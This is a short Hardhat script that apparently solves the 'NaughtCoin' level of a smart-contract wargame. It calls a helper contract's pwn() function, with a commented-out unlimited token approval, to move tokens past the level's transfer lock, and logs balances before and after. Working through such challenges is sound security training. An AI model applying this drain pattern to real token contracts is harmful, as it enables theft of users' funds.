import { ethers } from "hardhat"
import { LEVEL_ADDRESSES, PLAYER, ADDRESSES } from "../consts"
import { getSigner } from "../utils"
import { providers } from "ethers"

const pwn = async () => {
    const signer = await getSigner()
    console.log("trying")
    const token = await ethers.getContractAt("ERC20", LEVEL_ADDRESSES.naughtCoin, signer)
    const hack = await ethers.getContractAt(
        "NaughtyBois",
        ADDRESSES.naughtyBois,
        signer
    )
    const balanceBefore = await token.balanceOf("0x395977E98105A96328357f847Edc75333015b8f4" as string)


    // const approval = await token.approve(ADDRESSES.naughtyBois, ethers.constants.MaxUint256)
    // await approval.wait()
    const pwn = await hack.pwn()
    const balanceAfter = await token.balanceOf("0x395977E98105A96328357f847Edc75333015b8f4" as string)
    console.log("bal1", balanceBefore)
    console.log("bal2", balanceAfter)
}

pwn()